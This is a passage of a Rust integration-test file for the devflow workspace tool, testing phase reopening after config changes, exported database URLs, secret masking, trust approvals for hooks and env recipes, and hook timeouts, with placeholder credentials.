    assert!(again.unwrap().is_some(), "not ready: --if-new still runs");
    let started: Vec<_> = rec
        .phases
        .iter()
        .filter(|(_, s)| *s == PhaseState::Started)
        .map(|(p, _)| *p)
        .collect();
    assert_eq!(started, vec![Phase::Env, Phase::Hooks]);
    let migrated = receipt_of(&w);
    assert_eq!(migrated.version, 2);
    assert_eq!(migrated.status(), Status::Ready);
    assert_eq!(
        migrated.env_generation,
        Some(t.project.config.env_generation())
    );
    assert_eq!(migrated.services["db"].url, url);
    assert_eq!(migrated.instance_id, out.receipt.instance_id);
    assert_eq!(
        std::fs::read(w.path.join(".devflow/env")).unwrap(),
        env_before,
        "the file now has the compose project name again"
    );
    assert!(env_map(&w).contains_key("COMPOSE_PROJECT_NAME"));
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/runs"))
            .unwrap()
            .lines()
            .count(),
        2,
        "hooks run again after the environment is rewritten"
    );
}

const SERVICE: &str = "\n[services.db]\nengine = \"postgres\"\nmode = \"external\"\n";

/// Append `text` to the project's `devflow.toml` and reload the project.
fn edit_config(t: &Repo, edit: impl FnOnce(String) -> String) -> Project {
    let path = t.root.join("devflow.toml");
    let text = edit(std::fs::read_to_string(&path).unwrap());
    std::fs::write(&path, text).unwrap();
    Project::open(&t.root).unwrap()
}

fn attach_to(url: &str) -> SetupOptions {
    SetupOptions {
        database_url: Some(url.into()),
        ..Default::default()
    }
}

fn phase_states(receipt: &Receipt) -> Vec<(Phase, PhaseState, bool)> {
    [Phase::Services, Phase::Env, Phase::Hooks]
        .into_iter()
        .map(|p| {
            let r = receipt.phase(p);
            (p, r.state, r.required_skip)
        })
        .collect()
}

#[test]
fn a_service_added_later_reopens_services_env_and_hooks_until_setup_completes_them() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "w", SetupOptions::default()).unwrap();
    let w = out.workspace;
    assert_eq!(out.status, Status::Ready);
    assert_eq!(
        out.receipt.phase(Phase::Services).state,
        PhaseState::Skipped
    );
    assert!(!env_map(&w).contains_key("DATABASE_URL"));
    let runs = || std::fs::read_to_string(w.path.join(".devflow/runs")).unwrap();
    assert_eq!(runs().lines().count(), 1);

    // The project gains a postgres service.
    let project = edit_config(&t, |text| text + SERVICE);
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    let reopened = listed.receipt.as_ref().unwrap();
    assert_eq!(
        phase_states(reopened),
        vec![
            (Phase::Services, PhaseState::Skipped, true),
            (Phase::Env, PhaseState::Skipped, true),
            (Phase::Hooks, PhaseState::Skipped, true),
        ]
    );
    let why = reopened.phase(Phase::Services).detail.unwrap();
    assert!(why.contains("service 'db' added"), "{why}");
    // Reading changed nothing on disk.
    assert_eq!(receipt_of(&w).status(), Status::Ready);

    // `--if-new` must not take the "already set up" shortcut.
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let mut rec = Recorder::default();
    let resumed = setup::setup(&project, &w, attach_to(url), true, false, &mut rec)
        .unwrap()
        .expect("a stale workspace is not skipped");
    assert_eq!(resumed.status, Status::Ready);
    let started: Vec<_> = rec
        .phases
        .iter()
        .filter(|(_, s)| *s == PhaseState::Started)
        .map(|(p, _)| *p)
        .collect();
    assert_eq!(started, vec![Phase::Services, Phase::Env, Phase::Hooks]);
    let generation = project.config.service_generation("db");
    let stored = receipt_of(&w);
    assert_eq!(stored.services["db"].applied, generation);
    assert_eq!(stored.env_generation, Some(project.config.env_generation()));
    assert_eq!(env_map(&w)["DATABASE_URL"], url);
    assert_eq!(runs().lines().count(), 2, "hooks run again, at least once");

    // Current again: nothing is left to do.
    assert!(
        setup::setup(
            &project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::Ready)
    );
}

#[test]
fn a_changed_service_is_reapplied_by_the_next_switch() {
    let t = repo(&Hooks::default(), SERVICE);
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let out = create(&t.project, "w", attach_to(url)).unwrap();
    let w = out.workspace;
    assert_eq!(out.status, Status::Ready);
    let first = out.receipt.services["db"].applied.clone().unwrap();

    // Unrelated edits do not matter; editing the service does.
    let project = edit_config(&t, |text| text.replace("[hooks]", "[hooks]\n# a comment"));
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::Ready)
    );
    let project = edit_config(&t, |text| {
        text.replace(
            "mode = \"external\"\n",
            "mode = \"external\"\nrequire_cow = true\n",
        )
    });
    assert_ne!(project.config.service_generation("db").unwrap(), first);
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    assert!(
        listed
            .receipt
            .as_ref()
            .unwrap()
            .phase(Phase::Services)
            .detail
            .unwrap()
            .contains("'db' changed")
    );

    // A switch into the workspace completes the reopened phases.
    let switched = setup::switch(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(switched.status, Status::Ready);
    let stored = receipt_of(&w);
    assert_eq!(
        stored.services["db"].applied,
        project.config.service_generation("db")
    );
    assert_eq!(stored.services["db"].url, url, "the binding itself is kept");
    assert_eq!(env_map(&w)["DATABASE_URL"], url);
}

/// A binding as a server-backed setup records it, with scratch databases.
fn with_scratch(receipt: &mut Receipt, url: &str, extras: &[(&str, &str)]) {
    use devflow_core::receipt::{DataBinding, ExtraBinding};
    let mut bound = ServiceBinding::postgres(
        DataBinding {
            branch_id: Some(uuid::Uuid::new_v4()),
            database: "df_proj_x".into(),
            role: "dfl_x".into(),
            url: url.into(),
            source: "empty".into(),
            owned: true,
        },
        None,
    );
    for (name, database) in extras {
        bound.extras.insert(
            (*name).into(),
            ExtraBinding {
                database: (*database).into(),
            },
        );
    }
    receipt.services.insert("db".into(), bound);
}

#[test]
fn scratch_urls_are_exported_for_the_configured_names_with_the_bindings_login() {
    let url = "postgres://dfl_x:S3cr3t%2Fpw@db.internal:6543/df_proj_x?sslmode=disable"; // kingfisher:ignore
    let t = repo(
        &Hooks::default(),
        &format!("{SERVICE}extra_databases = [\"test\", \"shadow\", \"e2e\"]\n"),
    );
    let w = create(&t.project, "w", attach_to(url)).unwrap();
    let mut receipt = w.receipt.clone();
    // `e2e` is configured but the server has not provisioned it (yet); `old`
    // is provisioned but no longer configured: neither is exported.
    with_scratch(
        &mut receipt,
        url,
        &[
            ("test", "df_proj_x_1"),
            ("shadow", "df_proj_x_2"),
            ("old", "df_proj_x_9"),
        ],
    );
    let vars: std::collections::HashMap<_, _> = setup::env_vars(&t.project, &w.workspace, &receipt)
        .into_iter()
        .collect();
    assert_eq!(vars["DATABASE_URL"], url);
    assert_eq!(
        vars["TEST_DATABASE_URL"],
        "postgres://dfl_x:S3cr3t%2Fpw@db.internal:6543/df_proj_x_1?sslmode=disable", // kingfisher:ignore
        "the binding's login, password, endpoint and options; another database"
    );
    assert_eq!(
        vars["SHADOW_DATABASE_URL"],
        "postgres://dfl_x:S3cr3t%2Fpw@db.internal:6543/df_proj_x_2?sslmode=disable" // kingfisher:ignore
    );
    assert!(!vars.contains_key("E2E_DATABASE_URL"));
    assert!(!vars.contains_key("OLD_DATABASE_URL"));
    // They are credentials like DATABASE_URL: masked wherever output is shown.
    for name in ["DATABASE_URL", "TEST_DATABASE_URL", "SHADOW_DATABASE_URL"] {
        let shown = devflow_core::redact::text(&vars[name]);
        assert!(!shown.contains("S3cr3t"), "{name}: {shown}");
    }
    // A binding that lists none exports none.
    receipt.services.get_mut("db").unwrap().extras.clear();
    let vars = setup::env_vars(&t.project, &w.workspace, &receipt);
    assert!(
        vars.iter()
            .all(|(k, _)| !k.ends_with("_DATABASE_URL") || k == "DATABASE_URL"),
        "{vars:?}"
    );
}

#[test]
fn changing_extra_databases_reopens_services_and_a_url_only_attachment_says_it_has_none() {
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let t = repo(&Hooks::default(), SERVICE);
    let out = create(&t.project, "w", attach_to(url)).unwrap();
    let w = out.workspace;
    assert_eq!(out.status, Status::Ready);

    // Naming a scratch database changes the service: the workspace needs a
    // setup (or the next switch) to provision it.
    let project = edit_config(&t, |text| {
        text.replace(
            "mode = \"external\"\n",
            "mode = \"external\"\nextra_databases = [\"test\"]\n",
        )
    });
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    assert!(
        listed
            .receipt
            .as_ref()
            .unwrap()
            .phase(Phase::Services)
            .detail
            .unwrap()
            .contains("'db' changed")
    );
    // A URL the user attached names no branch devflow could add a database
    // to: setup completes, says so, and exports no scratch URL.
    let switched = setup::switch(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(
        switched.status,
        Status::Ready,
        "{:?}",
        switched.receipt.phases
    );
    assert!(
        switched
            .warnings
            .iter()
            .any(|w| w.contains("extra_databases") && w.contains("attached")),
        "{:?}",
        switched.warnings
    );
    assert!(!env_map(&w).contains_key("TEST_DATABASE_URL"));
    assert_eq!(env_map(&w)["DATABASE_URL"], url);

    // Taking the names away again is a change too, and a quiet one.
    let project = edit_config(&t, |text| {
        text.replace("extra_databases = [\"test\"]\n", "")
    });
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );
    let switched = setup::switch(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(switched.status, Status::Ready);
    assert!(switched.warnings.is_empty(), "{:?}", switched.warnings);
}

#[test]
fn deliberate_skips_survive_a_configuration_change() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let no_db = create(
        &t.project,
        "no-db",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap()
    .workspace;
    let no_hooks = create(
        &t.project,
        "no-hooks",
        SetupOptions {
            no_hooks: true,
            ..Default::default()
        },
    )
    .unwrap()
    .workspace;
    assert!(receipt_of(&no_db).phase(Phase::Services).deliberate);
    assert!(receipt_of(&no_hooks).phase(Phase::Hooks).deliberate);

    let project = edit_config(&t, |text| text + SERVICE);
    let listed = setup::list(&project).unwrap();
    // `--no-db`: nothing derived from services applies to it, so it stays ready.
    let status = |name: &str| {
        listed
            .iter()
            .find(|l| l.workspace.name == name)
            .unwrap()
            .status
    };
    assert_eq!(status("no-db"), Some(Status::Ready));
    // `--no-hooks`: services and env reopen, the hooks skip is kept.
    assert_eq!(status("no-hooks"), Some(Status::NeedsAttention));
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let done = setup::setup(
        &project,
        &no_hooks,
        attach_to(url),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(done.status, Status::Ready);
    assert_eq!(done.receipt.phase(Phase::Hooks).state, PhaseState::Skipped);
    assert!(done.receipt.phase(Phase::Hooks).deliberate);
    assert!(
        !no_hooks.path.join(".devflow/runs").exists(),
        "hooks stayed skipped"
    );
}

#[test]
fn a_removed_service_keeps_its_binding_and_reopens_the_environment() {
    let t = repo(&Hooks::default(), SERVICE);
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let w = create(&t.project, "w", attach_to(url)).unwrap().workspace;
    assert_eq!(env_map(&w)["DATABASE_URL"], url);
    let project = edit_config(&t, |text| text.replace(SERVICE, "\n"));
    assert!(project.config.postgres().is_none());
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    let receipt = listed.receipt.as_ref().unwrap();
    assert_eq!(
        receipt.phase(Phase::Services).state,
        PhaseState::Done,
        "nothing to bind for a service that is gone"
    );
    assert!(receipt.phase(Phase::Env).required_skip);
    assert!(
        receipt
            .phase(Phase::Env)
            .detail
            .unwrap()
            .contains("'db' removed"),
    );
    // The binding is still in the receipt: nothing is deleted.
    assert_eq!(receipt_of(&w).services["db"].url, url);
}

const RECIPES: &str = "\n[env]\npresets = [\"laravel\"]\nDIRECT_URL = \"${DATABASE_URL}\"\n\
                       AUTH = \"${PGUSER}:${PGPASSWORD}\"\nPLAIN = \"http://${PGHOST}\"\n";
const SECRET_URL: &str = "postgres://dfl_x:S3cr3t%2Fpw@db.internal:6543/df_proj_x"; // kingfisher:ignore

#[test]
fn every_workspace_exports_a_compose_project_name_built_from_its_identity() {
    let t = plain();
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    let b = create(&t.project, "b", SetupOptions::default()).unwrap();
    let name = |out: &SetupOutcome| env_map(&out.workspace)["COMPOSE_PROJECT_NAME"].clone();
    let project8 = &t.project.id().simple().to_string()[..8];
    for out in [&a, &b] {
        let instance8 = &out.receipt.instance_id.simple().to_string()[..8];
        assert_eq!(name(out), format!("df-{project8}-{instance8}"));
    }
    assert_ne!(name(&a), name(&b), "one per workspace");
}

#[test]
fn env_recipes_and_presets_reach_the_env_file_and_hooks_with_secrets_masked() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"slug=$COMPOSE_PROJECT_NAME\"",
                "echo \"direct=$DIRECT_URL auth=$AUTH pw=$DB_PASSWORD host=$DB_HOST plain=$PLAIN\"",
            ],
            ..Default::default()
        },
        &format!("{SERVICE}{RECIPES}"),
    );
    trust::approve(&t.project).unwrap();
    let mut rec = Recorder::default();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "w".into(),
            from: None,
            options: attach_to(SECRET_URL),
        },
        &mut rec,
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let env = env_map(&out.workspace);
    assert_eq!(env["DATABASE_URL"], SECRET_URL);
    assert_eq!(env["DIRECT_URL"], SECRET_URL);
    assert_eq!(env["AUTH"], "dfl_x:S3cr3t/pw");
    assert_eq!(env["PLAIN"], "http://db.internal");
    assert_eq!(env["DB_CONNECTION"], "pgsql");
    assert_eq!(env["DB_HOST"], "db.internal");
    assert_eq!(env["DB_PORT"], "6543");
    assert_eq!(env["DB_DATABASE"], "df_proj_x");
    assert_eq!(env["DB_USERNAME"], "dfl_x");
    assert_eq!(env["DB_PASSWORD"], "S3cr3t/pw");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(env_file::path(&out.workspace.path))
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(
            mode & 0o777,
            0o600,
            "values derived from secrets live in a 0600 file"
        );
    }

    // Hooks get the recipes; what was derived from the password is masked in
    // everything shown or logged, though `AUTH` is not secret by name or shape.
    // `DIRECT_URL` is a recipe built on the password, so it is masked whole.
    let direct = "direct=*** auth=*** pw=*** host=db.internal plain=http://db.internal".to_string();
    assert!(rec.lines.contains(&direct), "{:?}", rec.lines);
    assert!(
        rec.lines.contains(&format!("slug={}", out.receipt.slug())),
        "{:?}",
        rec.lines
    );
    let log = std::fs::read_to_string(out.hooks.as_ref().unwrap().log.as_ref().unwrap()).unwrap();
    for text in [log.as_str(), &rec.lines.join("\n")] {
        assert!(!text.contains("S3cr3t"), "{text}");
    }
    // And never in what the outcome says.
    let outcome = serde_json::to_string(&out.receipt.phase(Phase::Env)).unwrap();
    assert!(!outcome.contains("S3cr3t"), "{outcome}");
    assert!(out.warnings.is_empty(), "{:?}", out.warnings);
}

#[test]
fn env_recipes_that_need_a_database_are_left_out_of_a_workspace_without_one() {
    let t = repo(&Hooks::default(), &format!("{SERVICE}{RECIPES}"));
    trust::approve(&t.project).unwrap();
    let out = create(
        &t.project,
        "nodb",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    let env = env_map(&out.workspace);
    for gone in ["DIRECT_URL", "AUTH", "PLAIN", "DB_HOST", "DATABASE_URL"] {
        assert!(!env.contains_key(gone), "{gone} in {env:?}");
    }
    assert!(env.contains_key("COMPOSE_PROJECT_NAME"));
    let warnings = out.warnings.join("\n");
    assert!(
        warnings.contains("laravel") && warnings.contains("no postgres binding"),
        "{warnings}"
    );
    for key in ["env.DIRECT_URL", "env.AUTH", "env.PLAIN"] {
        assert!(warnings.contains(key), "{key} in {warnings}");
    }
}

#[test]
fn untrusted_env_recipes_are_not_applied_and_leave_the_workspace_needing_attention() {
    let t = repo(&Hooks::default(), &format!("{SERVICE}{RECIPES}"));
    // Nothing runs, yet the recipes put values into every process that loads
    // the file: they wait for the approval like hooks do.
    let out = create(&t.project, "w", attach_to(SECRET_URL)).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let env = out.receipt.phase(Phase::Env);
    assert!(
        env.state == PhaseState::Skipped && env.required_skip,
        "{env:?}"
    );
    assert!(env.detail.unwrap().contains("approve"));
    let vars = env_map(&out.workspace);
    assert_eq!(
        vars["DATABASE_URL"], SECRET_URL,
        "what devflow generates is there"
    );
    assert!(vars.contains_key("COMPOSE_PROJECT_NAME"));
    for gone in ["DIRECT_URL", "AUTH", "PLAIN", "DB_HOST", "DB_PASSWORD"] {
        assert!(!vars.contains_key(gone), "{gone} in {vars:?}");
    }

    // One approved run applies them without storing anything.
    let w = out.workspace;
    let once = setup::setup(
        &t.project,
        &w,
        SetupOptions {
            approval: Some(trust::Approval::of(&trust::scope(&t.project))),
            ..Default::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(once.status, Status::Ready, "{:?}", once.receipt.phases);
    assert_eq!(env_map(&w)["DIRECT_URL"], SECRET_URL);
    assert!(matches!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
}

#[test]
fn the_approval_covers_pitchfork_processes_and_a_version_one_approval_covers_nothing() {
    // Rewrites trust.toml by hand: alone in a child process, so the other
    // tests' approvals (one shared file in the parent) cannot race with it.
    const NAME: &str =
        "the_approval_covers_pitchfork_processes_and_a_version_one_approval_covers_nothing";
    if !in_child(NAME, &[]) {
        return;
    }
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    assert_eq!(a.status, Status::Ready, "{:?}", a.receipt.phases);
    // The digest the hooks ran under is the whole scope's.
    let digest = trust::digest(&t.project);
    assert_eq!(a.receipt.hooks_digest.as_deref(), Some(digest.as_str()));

    // A daemon appears in the project's pitchfork.toml (committed, so the new
    // worktree has it too): the approval no longer covers the scope, so the
    // hooks it governed do not run.
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\ncron = \"0 * * * *\"\n",
    )
    .unwrap();
    commit_all(
        &git2::Repository::open(&t.root).unwrap(),
        "add a pitchfork daemon",
    );
    let project = Project::open(&t.root).unwrap();
    let state = trust::state(&project).unwrap();
    assert!(
        matches!(
            state,
            trust::TrustState::Untrusted {
                previously_trusted: true,
                format_changed: false,
                ..
            }
        ),
        "{state:?}"
    );
    assert!(project_scope_flags_cron(&project));
    let b = create(&project, "b", SetupOptions::default()).unwrap();
    assert_eq!(b.status, Status::NeedsAttention);
    assert!(!b.workspace.path.join(".devflow/runs").exists());
    assert!(
        b.receipt
            .phase(Phase::Hooks)
            .detail
            .unwrap()
            .contains("not trusted"),
        "{:?}",
        b.receipt.phase(Phase::Hooks)
    );
    // Approving the reviewed scope (daemons included) lets setup finish.
    trust::approve_scope(&project, &trust::scope(&project)).unwrap();
    let b = setup::setup(
        &project,
        &b.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(b.status, Status::Ready, "{:?}", b.receipt.phases);
    assert!(b.workspace.path.join(".devflow/runs").is_file());

    // An approval written by version 1 (hooks only, no version) is not an approval.
    let config_dir = std::env::var("DEVFLOW_CONFIG_DIR").unwrap();
    let file = Path::new(&config_dir).join("trust.toml");
    let text = std::fs::read_to_string(&file).unwrap();
    let mut v1 = String::new();
    for block in text.split("[[approval]]").skip(1) {
        let mine = block.contains(&project.id().to_string());
        let kept: Vec<_> = block
            .lines()
            .filter(|l| !(mine && l.starts_with("version")))
            .collect();
        v1.push_str("[[approval]]");
        v1.push_str(&kept.join("\n"));
        v1.push('\n');
    }
    std::fs::write(&file, v1).unwrap();
    let state = trust::state(&project).unwrap();
    assert!(
        matches!(
            state,
            trust::TrustState::Untrusted {
                previously_trusted: true,
                format_changed: true,
                ..
            }
        ),
        "{state:?}"
    );
    let c = create(&project, "c", SetupOptions::default()).unwrap();
    assert_eq!(
        c.status,
        Status::NeedsAttention,
        "the old approval authorizes nothing"
    );
    assert!(!c.workspace.path.join(".devflow/runs").exists());
}

fn project_scope_flags_cron(project: &Project) -> bool {
    let scope = trust::scope(project);
    scope.has_autonomous_triggers()
        && scope
            .processes
            .autonomous
            .iter()
            .any(|t| t.daemon == "api" && t.trigger == "cron")
}

#[test]
fn the_scope_and_its_digest_never_contain_what_devflow_generates() {
    let t = repo(&Hooks::default(), &format!("{SERVICE}{RECIPES}"));
    let before = trust::scope(&t.project);
    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "w", attach_to(SECRET_URL)).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let after = trust::scope(&t.project);
    assert_eq!(
        before.digest, after.digest,
        "setting up changes nothing in the scope"
    );
    assert_eq!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Trusted
    );
    let shown = serde_json::to_string(&after).unwrap();
    for generated in ["S3cr3t", "df_proj_x", "db.internal"] {
        assert!(!shown.contains(generated), "{generated} in {shown}");
    }
    assert!(shown.contains("${DATABASE_URL}") && shown.contains("${PGUSER}:${PGPASSWORD}"));
}

#[test]
fn changing_the_env_section_reopens_env_and_hooks_until_setup_applies_it() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        &format!("{SERVICE}{RECIPES}"),
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "w", attach_to(SECRET_URL))
        .unwrap()
        .workspace;
    assert_eq!(env_map(&w)["PLAIN"], "http://db.internal");
    assert_eq!(
        setup::list(&t.project).unwrap()[1].status,
        Some(Status::Ready)
    );

    let project = edit_config(&t, |text| {
        text.replace("http://${PGHOST}", "https://${PGHOST}")
    });
    trust::approve(&project).unwrap();
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    let receipt = listed.receipt.as_ref().unwrap();
    assert!(receipt.phase(Phase::Env).required_skip);
    assert!(receipt.phase(Phase::Hooks).required_skip);
    let out = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(env_map(&w)["PLAIN"], "https://db.internal");
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/runs"))
            .unwrap()
            .lines()
            .count(),
        2,
        "hooks run again after a configuration change"
    );
}

#[test]
fn a_no_db_workspace_picks_up_approved_env_changes_but_ignores_service_changes() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "[env]\nGREETING = \"hello\"\n",
    );
    trust::approve(&t.project).unwrap();
    let w = create(
        &t.project,
        "w",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap()
    .workspace;
    assert_eq!(env_map(&w)["GREETING"], "hello");
    let runs = || std::fs::read_to_string(w.path.join(".devflow/runs")).unwrap();
    assert_eq!(runs().lines().count(), 1);
    let status = |project: &Project| setup::list(project).unwrap()[1].status;
    assert_eq!(status(&t.project), Some(Status::Ready));

    // A service the workspace deliberately has no part in changes nothing.
    let with_service = edit_config(&t, |text| format!("{text}{SERVICE}"));
    assert_eq!(status(&with_service), Some(Status::Ready));

    // An approved `[env]` change reopens the environment and the hooks, but
    // not the services the workspace skipped on request.
    let project = edit_config(&t, |text| text.replace("hello", "hi"));
    trust::approve(&project).unwrap();
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    let receipt = listed.receipt.as_ref().unwrap();
    assert!(receipt.phase(Phase::Env).required_skip);
    assert!(receipt.phase(Phase::Hooks).required_skip);
    let services = receipt.phase(Phase::Services);
    assert!(
        services.deliberate && !services.required_skip,
        "{services:?}"
    );
    let out = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(env_map(&w)["GREETING"], "hi");
    assert_eq!(runs().lines().count(), 2, "hooks run again");
    assert_eq!(status(&project), Some(Status::Ready));
    assert!(
        !receipt_of(&w).services.contains_key("db"),
        "still no database"
    );
}

#[test]
fn a_removed_service_is_applied_once_not_exported_and_not_drift_forever() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        SERVICE,
    );
    trust::approve(&t.project).unwrap();
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let w = create(&t.project, "w", attach_to(url)).unwrap().workspace;
    let runs = || std::fs::read_to_string(w.path.join(".devflow/runs")).unwrap();
    assert_eq!(runs().lines().count(), 1);

    // The service is removed: the workspace needs a setup to apply it.
    let project = edit_config(&t, |text| text.replace(SERVICE, "\n"));
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );
    let mut rec = Recorder::default();
    let applied = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        applied.status,
        Status::Ready,
        "{:?}",
        applied.receipt.phases
    );
    assert_eq!(runs().lines().count(), 2, "the hooks ran once more");
    // The attachment was made under `services.db`; with the service gone it
    // is an orphan, never a fallback export.
    let env = env_map(&w);
    assert!(
        !env.contains_key("DATABASE_URL") && !env.contains_key("PGHOST"),
        "{env:?}"
    );
    let kept = receipt_of(&w).services["db"].clone();
    assert_eq!(kept.url, url, "the binding is kept");
    assert!(kept.orphaned);

    // Nothing is left to apply: the workspace stays ready and a second setup
    // starts no phase and reruns no hook.
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::Ready)
    );
    let mut rec = Recorder::default();
    let again = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(again.status, Status::Ready);
    assert!(
        rec.phases.iter().all(|(_, s)| *s != PhaseState::Started),
        "{:?}",
        rec.phases
    );
    assert_eq!(runs().lines().count(), 2);

    // The service coming back is applied afresh and exports its binding again.
    let project = edit_config(&t, |text| text + SERVICE);
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );
    let back = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(back.status, Status::Ready);
    assert_eq!(env_map(&w)["DATABASE_URL"], url);
    assert!(!receipt_of(&w).services["db"].orphaned);
}

#[test]
fn named_hook_tables_run_with_their_names_and_their_own_timeouts() {
    let t = plain();
    let project = edit_config(&t, |text| {
        text.replace(
            "setup = []",
            "setup = [\n  'echo plain',\n  { name = \"migrate\", run = 'echo migrating' },\n  \
             { name = \"seed\", run = 'sleep 30', timeout = \"300ms\" },\n  \
             'touch .devflow/never',\n]",
        )
    });
    assert_eq!(project.config.hooks.setup.len(), 4);
    trust::approve(&project).unwrap();
    let mut rec = Recorder::default();
    let started = std::time::Instant::now();
    let out = setup::create(
        &project,
        CreateRequest {
            name: "w".into(),
            from: None,
            options: SetupOptions::default(),
        },
        &mut rec,
    )
    .unwrap();
    assert!(
        started.elapsed() < std::time::Duration::from_secs(25),
        "the entry's 300ms timeout applies, not the section's 15m"
    );
    assert_eq!(out.status, Status::NeedsAttention);
    let report = out.hooks.as_ref().unwrap();
    assert!(!report.ok);
    let names: Vec<_> = report.runs.iter().map(|r| r.name.as_deref()).collect();
    assert_eq!(names, [None, Some("migrate"), Some("seed")]);
    assert!(report.runs[2].timed_out, "{:?}", report.runs[2]);
    assert!(!out.workspace.path.join(".devflow/never").exists());
    let hooks = out.receipt.phase(Phase::Hooks);
    assert_eq!(hooks.state, PhaseState::Failed);
    assert!(
        hooks
            .detail
            .unwrap()
            .contains("setup hook 'seed' (`sleep 30`) timed out"),
    );
    // Output and log announce the named entries.
    assert!(
        rec.lines
            .contains(&"[migrate] $ echo migrating".to_string()),
        "{:?}",
        rec.lines
    );
    assert!(rec.lines.contains(&"$ echo plain".to_string()));
    let log = std::fs::read_to_string(report.log.as_ref().unwrap()).unwrap();
    assert!(log.contains("[seed] $ sleep 30"), "{log}");
}

#[test]
fn a_version_one_binding_without_a_postgres_service_is_reported_not_guessed() {
    let t = plain();
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let out = create(
        &t.project,
        "old",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    let w = out.workspace.clone();
    assert_eq!(env_map(&w)["DATABASE_URL"], url, "version 1 exported it");
    downgrade_to_v1(&w);

    let listed = &setup::list(&t.project).unwrap()[1];
    let seen = listed.receipt.as_ref().unwrap();
    assert!(seen.services.is_empty());
    assert_eq!(seen.unmapped.as_ref().map(|d| d.url.as_str()), Some(url));
    assert_eq!(
        listed.status,
